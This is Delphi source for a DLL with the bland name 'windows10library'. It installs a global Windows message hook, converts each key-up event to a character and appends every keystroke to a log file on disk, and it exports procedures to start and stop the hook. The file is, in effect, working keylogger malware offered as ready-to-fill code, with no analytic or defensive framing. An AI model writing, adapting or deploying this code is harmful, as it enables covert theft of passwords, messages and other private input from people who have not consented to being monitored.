library windows10library;
uses
  Windows,
  Messages,
  SysUtils;

var
  TheHookHandle: HHOOK;
  FF: TextFile;
  FileName: string;

function TheHookProc(Code : integer; wParam : DWORD; lParam : DWORD): longint; stdcall;
var
  LogText: string;
  KeyState: TKeyBoardState;
  VirtualKey: byte;
  ScanCode: byte;
  AChar: array[0..1] of Char;
  buf: string;
begin
  result := 0;
  if (Code = HC_ACTION) then begin
    if (tagMSG(Ptr(lParam)^).Message = WM_KEYUP) then begin
      // translate the key to ASCII
      GetKeyboardState(KeyState);
      VirtualKey := tagMSG(Ptr(lParam)^).WParam;
      ScanCode := HIBYTE(LOWORD(tagMSG(Ptr(lParam)^).lParam));
      ToAscii(VirtualKey, ScanCode, KeyState, AChar, 0);
      // exceptions
      case VirtualKey of
        VK_BACK: buf := 'Backspace';
        VK_DELETE: buf := 'Delete';
        VK_TAB: buf := 'Tab';
        VK_RETURN: buf := 'Enter';
        VK_SHIFT: buf := 'Shift';
        VK_CAPITAL: buf := 'CapsLock';
        VK_ESCAPE: buf := 'Esc';
        VK_SPACE: buf := ' ';
        // etc. keys you're interested in
      else
        buf := AChar[0];
      end;

      LogText:=LogText + buf;

      // open the log file
      FileName := 'log.txt'; // your log filename here
      AssignFile(FF, FileName);
      if FileExists(FileName) then Append(FF)
      else Rewrite(FF);
      // write to the log
      Write(FF, LogText);
      CloseFile(FF);
    end;
  end;
  {Call the next hook in the hook chain}
  if (Code < 0) then
    result := CallNextHookEx(TheHookHandle, Code, wParam, lParam);
end;

procedure StartTheHook; stdcall;
begin
  if (TheHookHandle = 0) then begin

    // set the hook
    TheHookHandle := SetWindowsHookEx(WH_GETMESSAGE, @TheHookProc, hInstance, 0);
  end;
end;

procedure StopTheHook; stdcall;
begin
  if (TheHookHandle <> 0) then begin
    // Remove our hook and clear our hook handle
    if (UnhookWindowsHookEx(TheHookHandle) <> FALSE) then begin
      TheHookHandle := 0;
    end;

  end;
end;

exports
  StartTheHook,
  StopTheHook;

begin
end.
